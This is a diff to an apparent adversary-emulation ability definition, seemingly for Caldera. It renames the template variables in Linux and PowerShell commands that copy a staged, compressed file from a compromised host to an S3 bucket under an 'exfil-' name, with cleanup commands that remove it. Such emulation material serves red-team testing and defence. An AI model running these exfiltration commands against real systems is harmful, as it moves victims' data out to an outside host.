@@ -11,23 +11,26 @@
     linux:
       sh:
         command: |
-          LocalFile='#{host.dir.compress}';
+          LocalFile='#{file.staged_at}';
           RemoteName="exfil-#{paw}-$(basename $LocalFile)";
-          aws s3 cp #{host.dir.compress} s3://#{s3.source.name}/$RemoteName;
+          aws s3 cp #{file.staged_at} s3://#{custom.s3_name}/$RemoteName;
         cleanup: |
-          LocalFile='#{host.dir.compress}';
+          LocalFile='#{file.staged_at}';
           RemoteName="exfil-#{paw}-$(basename $LocalFile)";
-          aws s3 rm s3://#{s3.source.name}/$RemoteName;
+          aws s3 rm s3://#{custom.s3_name}/$RemoteName;
     windows:
       psh:
         command: |
-          $SourceFile = (Get-Item #{host.dir.compress});
+          $SourceFile = (Get-Item #{file.staged_at});
           $RemoteName = "exfil-#{paw}-$($SourceFile.name)";
-          aws s3 cp #{host.dir.compress} s3://#{s3.source.name}/$RemoteName;
+          aws s3 cp #{file.staged_at} s3://#{custom.s3_name}/$RemoteName;
         cleanup: |
-          $SourceFile = (Get-Item #{host.dir.compress});
+          $SourceFile = (Get-Item #{file.staged_at});
           $RemoteName = "exfil-#{paw}-$($SourceFile.name)";
-          aws s3 rm s3://#{s3.source.name}/$RemoteName;
+          aws s3 rm s3://#{custom.s3_name}/$RemoteName;
   requirements:
     - plugins.stockpile.app.requirements.paw_provenance:
-      - source: host.dir.compress
+      - source: file.staged_at
+    - plugins.stockpile.app.requirements.basic:
+        - source: file.staged_at
+          edge: is_compressed
